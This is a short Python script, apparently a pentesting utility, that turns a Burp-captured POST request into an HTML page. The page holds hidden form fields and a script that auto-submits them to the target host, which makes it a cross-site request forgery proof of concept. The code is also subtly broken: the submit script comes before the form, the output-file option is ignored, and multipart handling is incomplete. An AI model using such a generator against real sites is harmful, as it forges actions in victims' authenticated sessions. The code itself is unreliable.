from optparse import OptionParser

parser = OptionParser()
parser.add_option("-f", "--file", dest="filename",
                  help="input request FILE from burp", metavar="FILE")
parser.add_option("-o", "--out", dest="dest_file",
                  help="write PoC to FILE", metavar="OUT")

(options, args) = parser.parse_args()

f= open(options.filename,"r")
out = open("test.html","w+")

file = f.readlines()

prev = "!"
boundary = ""
method = ""
body = ""
for line in file:
	if line.startswith("POST"):
		method = "POST"
		endpoint = line.split()[1]
	if line.startswith("Host:"):
		url = "https://" + line.split()[1]
		out.write('<script>document.getElementById("CSRF").submit()</script>\n')
		out.write("<form method=" + method + " id=CSRF action=" + url + endpoint +">\n")
	if line.startswith("Content-Type:"):
		content = line.split()
		if content[1] == "multipart/form-data;":
			boundary = content[2].split("=")[1]
	if boundary != "" and line.startswith("Content-Disposition"):
		name = line.split("=")[1]
	if len(prev) == 2:
		body = line
		print(body)
		break
	prev = line

if boundary == "":
	data = body.split("&")

	print (body)
	for d in data:
		splits = d.split("=")
		out.write("\t<input type=hidden name=" + splits[0] + " id=" + splits[0] + " value=" + splits[1]+ ">\n")
	out.write("</form>\n")
